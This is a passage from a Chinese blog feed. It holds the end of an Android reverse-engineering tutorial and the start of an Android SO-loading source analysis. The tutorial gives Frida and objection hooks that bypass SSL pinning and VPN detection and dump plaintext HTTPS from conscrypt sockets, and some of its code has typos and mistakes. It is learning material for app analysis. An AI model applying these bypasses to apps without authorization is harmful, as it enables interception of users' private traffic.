disable&quot;</span><br></pre></td></tr></table></figure><p>救了个大命为什么两种方法都不行，还是红叉叉！发送不了验证码。失败的原因是拒绝连接，而不是有关SSL证书什么的。（学会看连接失败的原因很重要）</p><img src="/posts/56766070/4.4.7.png" class=""><img src="/posts/56766070/4.4.8.png" class=""><p>最后发现关闭了VPN还是注册不了，我猜可能是服务器无了，应该不是我们的问题。那么如果成功后就可以抓到带有手机号的包。</p><img src="/posts/56766070/4.4.8.jpg" class=""><h3 id="4-4-3-证书绑定开发逆向和混淆后的解绑"><a href="#4-4-3-证书绑定开发逆向和混淆后的解绑" class="headerlink" title="4.4.3 证书绑定开发逆向和混淆后的解绑"></a>4.4.3 证书绑定开发逆向和混淆后的解绑</h3><p>很多框架都可以实现SSL pinning，上面使用传统的HttpURLConnection类封装请求，客户端锁定操作需要实现X509TrustManager接口的<code>checkServerTrusted()</code>方法只是其中之一，通过对比预埋证书信息与请求网站的的证书来判断。</p><p>使用的objection也是一样，在objection源码里面预设了很多框架的hook SSL pinning的代码，有okHttp3框架、PinningTrustManager框架、TrustManagerImpl框架、SSLCertificateChecker框架等。而我们只需用一条命令就可以实现解绑，非常方便。</p><p>瘦蛟舞大佬也写了一个<a href="https://github.com/WooyunDota/DroidSSLUnpinning">解除安卓证书锁定</a>的工具，覆盖到了更多的框架。</p><h3 id="4-4-4-混淆案例"><a href="#4-4-4-混淆案例" class="headerlink" title="4.4.4 混淆案例"></a>4.4.4 混淆案例</h3><p>VPN抓包，抓到了包但显示不出内容，错误提示“需要信任Charles根证书”，但我们已经把Charles根证书放进了系统凭据中，所以是App默认不信任系统的根证书，也就是进行了SSL pinning。</p><img src="/posts/56766070/4.5.1.png" class=""><p>解绑的第一步就是要知道App是用了哪个框架的SSL pinning，或者将上面的SSL Pinning方法全都来一遍，还是抓不到内容可以合理怀疑是做了混淆，使我们hook不到对应的方法。</p><p>可以从系统角度出发，客户端或服务器校验证书时是利用证书的哈希值来判断该证书是否有效。计算证书的哈希值就必须要打开证书，所以肯定会有文件打开函数。我们可以使用objection hook文件打开函数，看是否打开了证书。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes File//查找与文件有关的类</span><br><span class="line">android hooking watch class_method java.io.File$init --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p>hook好后尝试注册，发现确实打开了证书算哈希。上面的<code>checkServerTrusted()</code>等函数用上面的框架方法不能通过，继续往下看发现<code>CertificatePinner.java</code>，它是okHttp里面的。</p><img src="/posts/56766070/4.4.9.jpg" class=""><p>如果实在不知道的话可以用WallBreaker查看<code>z1.g</code>这个类的方法和常量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugin load ./~Wallbreaker//加载插件</span><br><span class="line">plugin wallbreaker classdump z1.g//将这个类的常量和方法dump下来</span><br><span class="line">plugin wallbreaker objectsearch z1.g//查找类的实例</span><br></pre></td></tr></table></figure><img src="/posts/56766070/4.4.10.jpg" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectdump --fullname 0x24e6//将类的实例dump下来</span><br></pre></td></tr></table></figure><img src="/posts/56766070/4.4.11.jpg" class=""><p>由于里面的<code>a()</code>方法是混淆过的，所以需要找到okHttp里<code>CertificatePinner.java</code>中对应的方法。又由于<code>a()</code>方法与SSL pinning相关，所以可以在大佬的脚本上查看hook okHttp中的哪个函数，<code>a()</code>大概率就是那个函数。</p><img src="/posts/56766070/4.4.12.jpg" class=""><p>可以照着大佬的脚本写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookCer</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;z1.g&quot;</span>).<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;z1.g. was called!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookCer</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">serImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/56766070/4.4.13.jpg" class=""><p>此时进行抓包也没有问题了。</p><img src="/posts/56766070/4.4.14.jpg" class=""><h2 id="4-5-VPN抓包对抗"><a href="#4-5-VPN抓包对抗" class="headerlink" title="4.5 VPN抓包对抗"></a>4.5 VPN抓包对抗</h2><p>当我们开启VPN后，手机会多出一个叫“tun0”网卡，手机的所有流量都会经过这个网卡，所以使用Charles监听VPN，就可以抓到手机所有的流量。</p><img src="/posts/56766070/4.3.1.png" class=""><p>要想对抗VPN抓包，App可以通过判断<code>java.net.Network.getName()</code>是否等于“tun0”或“ppp0”来判断是否存在VPN。</p><p>但绕过这个检测也很简单，hook该API使其返回“rmnet_data1”即可。</p><h1 id="5-Socket通信抓包"><a href="#5-Socket通信抓包" class="headerlink" title="5. Socket通信抓包"></a>5. Socket通信抓包</h1><p>HTTPS并非是应用层的一种新协议，只是HTTP通信接口部分用SSL和TLS协议代替。通常HTTP直接和TCP通信，当使用SSL时，则演变成先和SSL通信，再由SSL和TCP通信。在采用SSL后，HTTP就拥有了HTTPS的加密、证书和完整性保护这些功能。</p><img src="/posts/56766070/5.1.1.png" class=""><p>Socket的本质是收发包的接口。它不是中间人抓包，而是网卡流量的dump转储下来。Wireshark抓的就是网卡的流量，如果抓HTTPS包，也就是SSL的流量，此时它不是明文转储，在Wireshark中解析不了HTTPS的内容。</p><p>Socket分为两种：TCP和UDP。服务器和客户端之间的通信都是通过Socket进行。在Socket眼里，所有流量都是RAW DATA，纯二进制。它不知道跑的是HTTP还是HTTPS，它只是一条通道，传的是二进制数据，只管是否是可靠传输，是否需要重传。</p><h2 id="5-1-TCP-IP应用层hook"><a href="#5-1-TCP-IP应用层hook" class="headerlink" title="5.1 TCP/IP应用层hook"></a>5.1 TCP/IP应用层hook</h2><p>SSL不止可以跟HTTP搭配，大多数应用层协议都可以跟SSL搭配，比如SMTP/POP/IMAP 、protobuf协议等。这些应用层协议如果跟SSL搭配，都需要解开SSL这一层。也就是说我们真正需要的不是TCP往上的包，因为TCP往上dump下来的是SSL的包，是经过加解密之后的包，是密文。如果我们想要看到明文，需要dump SSL的接口。可以通过hook SSL框架直接获得明文。</p><p>将App附加到objection上，查看App中使用到SSL的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes ssl</span><br></pre></td></tr></table></figure><img src="/posts/56766070/5.1.2.png" class=""><p>将这些有关ssl的类复制到一个TXT文件中，在每个类的前面添加<code>android hooking watch class</code>，也就是构造hook命令，形成脚本。执行脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.roysue.httpsocket explore -c ssl.txt</span><br></pre></td></tr></table></figure><p>在hook的过程中可能会崩溃，去掉崩溃的类即可。最后发现比较可疑的类：</p><img src="/posts/56766070/5.1.3.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.android.org.conscrypt.SslWrapper.write(java.io.FileDescriptor,[B,int,int,int)</span><br><span class="line">com.android.org.conscrypt.SslWrapper.read(java.io.FileDescriptor,[B,int,int,int)</span><br><span class="line">com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B,int,int)</span><br><span class="line">com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.wirte([B,int,int)</span><br></pre></td></tr></table></figure><p>以上<code>wirte()</code>和<code>read()</code>方法中的byte数组很有可能就是我们需要的明文，尝试来hook试试。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">jhexdump</span>(<span class="params">array,off,len</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> ptr = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(array.<span class="property">length</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;array.<span class="property">length</span>; i++)</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">writeS8</span>(ptr.<span class="title function_">add</span>(i), array[i])</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(ptr,&#123;<span class="attr">offset</span>:off,<span class="attr">length</span>:array.<span class="property">length</span>,<span class="attr">header</span>:flase,<span class="attr">ansi</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">    <span class="comment">//console.log(hexdump(ptr,&#123;offset:0,length:array.length,header:flase,ansi:false&#125;))</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_socket</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_SSLsocket&quot;</span>)</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">write</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">bytearray,int1,int2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">write</span>(bytearray,int1,int2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HTTP write result,bytearray,int1,int2 =&gt; &quot;</span>,result,bytearray,int1,int2)</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>)</span><br><span class="line">            <span class="comment">//console.log(&quot;bytearray contents =&gt; &quot;,ByteString.of(bytearray).hex())</span></span><br><span class="line">            <span class="comment">//console.log(jhexdump(bytearray,int1,int2))</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">jhexdump</span>(bytearray,int1,int2))</span><br><span class="line">            <span class="comment">//console.log(this.socket.value.getLocalAddress().toString())</span></span><br><span class="line">            <span class="comment">//sonsole.log(this.socket.value.getLocalPort())</span></span><br><span class="line">            <span class="comment">//console.log(this.socket.value.getRemoteSocketAddress().toString())</span></span><br><span class="line">            <span class="comment">//console.log(this.socket.value.getPort())</span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_SSLsocketandroid8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_SSLsocket&quot;</span>)</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream&quot;</span>).<span class="property">write</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">bytearray,int1,int2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">write</span>(bytearray,int1,int2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HTTPS write result,bytearray,int1,int2 =&gt; &quot;</span>,result,bytearray,int1,int2)</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>)</span><br><span class="line">            <span class="comment">//console.log(&quot;bytearray contents =&gt; &quot;,ByteString.of(bytearray).hex())</span></span><br><span class="line">            <span class="comment">//console.log(jhexdump(bytearray,int1,int2))</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">jhexdump</span>(bytearray,int1,int2))</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream&quot;</span>).<span class="property">read</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>,<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">bytearray,int1,int2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">write</span>(bytearray,int1,int2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HTTPS write result,bytearray,int1,int2 =&gt; &quot;</span>,result,bytearray,int1,int2)</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>)</span><br><span class="line">            <span class="comment">//console.log(&quot;bytearray contents =&gt; &quot;,ByteString.of(bytearray).hex())</span></span><br><span class="line">            <span class="comment">//console.log(jhexdump(bytearray,int1,int2))</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">jhexdump</span>(bytearray,<span class="number">0</span>,result))</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Main&quot;</span>)</span><br><span class="line">    <span class="comment">//hook_socket()</span></span><br><span class="line">    <span class="title function_">hook_SSLsocketandroid8</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/56766070/5.1.4.png" class=""><p>此时可以看到已经获取到HTTPS的内容了，说明我们找的SSL接口是没问题的。</p><p>从这些API中可以得到什么信息呢？至少可以得到远程的IP与port，本地IP与port。</p><img src="/posts/56766070/5.1.5.png" class=""><h2 id="5-2-TCP-IP传输层hook"><a href="#5-2-TCP-IP传输层hook" class="headerlink" title="5.2 TCP/IP传输层hook"></a>5.2 TCP/IP传输层hook</h2><p>Frida hook Socket</p><p>推荐一个r0ysue大佬写的<a href="https://github.com/r0ysue/r0capture">安卓通杀脚本</a></p><h2 id="5-3-TCP-IP网络层抓包"><a href="#5-3-TCP-IP网络层抓包" class="headerlink" title="5.3 TCP/IP网络层抓包"></a>5.3 TCP/IP网络层抓包</h2><p>彻底解决抓不到包的问题。自制路由器，这个就算了。</p><h3 id="5-3-1-环境配置"><a href="#5-3-1-环境配置" class="headerlink" title="5.3.1 环境配置"></a>5.3.1 环境配置</h3><p>在手机上再安装一个Linux操作系统。</p><p>下载与手机型号对应的<a href="https://www.kali.org/get-kali/#kali-mobile">kali nethunter</a>，使用种子下载会快很多。</p><p>…</p><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h1><p>爱吃菠菜大佬对以上知识点的总结：</p><img src="/posts/56766070/summary2.jpg" class="">]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-HTTP环境配置&quot;&gt;&lt;a href=&quot;#1-HTTP环境配置&quot; class=&quot;headerlink&quot; title=&quot;1. HTTP环境配置&quot;&gt;&lt;/a&gt;1. HTTP环境配置&lt;/h1&gt;&lt;p&gt;将主机与手机连上同一WiFi，使它们处于同一局域网内。&lt;/p&gt;
&lt;img src=&quot;/posts/56766070/1.1.5.jpg&quot; class=&quot;&quot;&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Android 8.1.0源码分析SO加载执行流程</title>
    <link href="http://example.com/posts/203cba03.html"/>
    <id>http://example.com/posts/203cba03.html</id>
    <published>2022-09-02T03:21:54.514Z</published>
    <updated>2022-11-17T06:25:30.434Z</updated>
    
    <content type="html"><![CDATA[<p>在<a href="https://v5le0n9.github.io/posts/15be101a.html#6-%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AAso">安卓逆向入门教程 6. 编写第一个so</a>中知道，要想调用某个so库中的Native方法，需要将so库加载进来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">myJNI</span> &#123;</span><br><span class="line">　　<span class="comment">//加载so库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;JniTest&quot;</span>);<span class="comment">//so库名字，全称为libJniTest.so</span></span><br><span class="line">    &#125;</span><br><span class="line">　　<span class="comment">//native方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">sayHello</span><span class="params">()</span>;<span class="comment">//调用so库中的sayHello()方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><p>可以看到在Java层加载so库用了<code>System.loadLibrary()</code>方法。其实加载一个so库，可以通过<code>System.load()</code>或<code>System.loadLibrary()</code>来加载。<code>System.loadLibrary()</code>只能加载APK包中jniLibs目录下的so，而<code>System.load()</code>可以加载任意路径下的so，这两种方式最终都会调用Android底层的<code>dlopen()</code>来打开so。</p><p>推荐一个查看<a href="http://www.aospxref.com/">Android源码的网站</a>，查看Android源码发现<code>System.load()</code>和<code>System.loadLibrary()</code>在<code>/libcore/ojluni/src/main/java/java/lang/System.java</code>中这样定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">load</span><span class="params">(String filename)</span> &#123;</span><br><span class="line">    Runtime.getRuntime().load0(VMStack.getStackClass1(), filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadLibrary</span><span class="params">(String libname)</span> &#123;</span><br><span class="line">    Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), libname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随意跟进去看看，发现这两个方法都会调用到<code>doLoad()</code>。</p><h1 id="1-Java层"><a href="#1-Java层" class="headerlink" title="1. Java层"></a>1. Java层</h1><h2 id="1-1-loadLibrary0"><a href="#1-1-loadLibrary0" class="headerlink" title="1.1 loadLibrary0()"></a>1.1 loadLibrary0()</h2><p>以<code>loadLibrary()</code>为例，进去<code>loadLibrary0()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/ojluni/src/main/java/java/lang/Runtime.java</span></span><br><span class="line"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">loadLibrary0</span><span class="params">(ClassLoader loader, String libname)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (libname.indexOf((<span class="type">int</span>)File.separatorChar) != -<span class="number">1</span>) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsatisfiedLinkError</span>(</span><br><span class="line"> <span class="string">&quot;Directory separator should not appear in library name: &quot;</span> + libname);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="type">String</span> <span class="variable">libraryName</span> <span class="operator">=</span> libname;</span><br><span class="line">     <span class="keyword">if</span> (loader != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> loader.findLibrary(libraryName);</span><br><span class="line">         <span class="keyword">if</span> (filename == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="comment">// It&#x27;s not necessarily true that the ClassLoader used</span></span><br><span class="line">             <span class="comment">// System.mapLibraryName, but the default setup does, and it&#x27;s</span></span><br><span class="line">             <span class="comment">// misleading to say we didn&#x27;t find &quot;libMyLibrary.so&quot; when we</span></span><br><span class="line">             <span class="comment">// actually searched for &quot;liblibMyLibrary.so.so&quot;.</span></span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsatisfiedLinkError</span>(loader + <span class="string">&quot; couldn&#x27;t find \&quot;&quot;</span> +</span><br><span class="line">                                            System.mapLibraryName(libraryName) + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> doLoad(filename, loader);</span><br><span class="line">         <span class="keyword">if</span> (error != <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsatisfiedLinkError</span>(error);</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> System.mapLibraryName(libraryName);</span><br><span class="line">    List&lt;String&gt; candidates = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    <span class="type">String</span> <span class="variable">lastError</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (String directory : getLibPaths()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">candidate</span> <span class="operator">=</span> directory + filename;</span><br><span class="line">        candidates.add(candidate);</span><br><span class="line">        <span class="keyword">if</span> (IoUtils.canOpenReadOnly(candidate)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">error</span> <span class="operator">=</span> doLoad(candidate, loader);</span><br><span class="line">            <span class="keyword">if</span> (error == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>; <span class="comment">// We successfully loaded the library. Job done.</span></span><br><span class="line">            &#125;</span><br><span class="line">            lastError = error;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lastError != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsatisfiedLinkError</span>(lastError);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsatisfiedLinkError</span>(<span class="string">&quot;Library &quot;</span> + libraryName + <span class="string">&quot; not found; tried &quot;</span> + candidates);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码的流程如下：</p><ol><li>若loader非空，则利用<code>findLibrary()</code>方法从ClassLoader中获取library的path；若loader为空，则利用<code>System.mapLibraryName()</code>方法获取library的name（比如传递“test”进来，返回的是“libtest.so”），然后利用<code>getLibPaths()</code>函数获取APK包的JniLibs目录的路径path。</li><li>得到library的path后，进入<code>doLoad()</code>方法。</li></ol><h2 id="1-2-doLoad"><a href="#1-2-doLoad" class="headerlink" title="1.2 doLoad()"></a>1.2 doLoad()</h2><p>在ClassLoader非空或空的情况下最终都得到了library的path，作为参数传入<code>doLoad()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /libcore/ojluni/src/main/java/java/lang/Runtime.java</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">doLoad</span><span class="params">(String name, ClassLoader loader)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">librarySearchPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (loader != <span class="literal">null</span> &amp;&amp; loader <span class="keyword">instanceof</span> BaseDexClassLoader) &#123;</span><br><span class="line">        <span class="type">BaseDexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> (BaseDexClassLoader) loader;</span><br><span class="line">        librarySearchPath = dexClassLoader.getLdLibraryPath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> nativeLoad(name, loader, librarySearchPath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">nativeLoad</span><span class="params">(String filename, ClassLoader loader,</span></span><br><span class="line"><span class="params">                                        String librarySearchPath)</span>;</span><br></pre></td></tr></table></figure><ul><li>若loader非空并且是BaseDexClassLoader的一个实例，通过<code>getLdLibraryPath()</code>方法将得到的所有路径用”:”连接形成字符串赋值到librarySearchPath，再调用<code>nativeLoad()</code>这个JNI方法；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 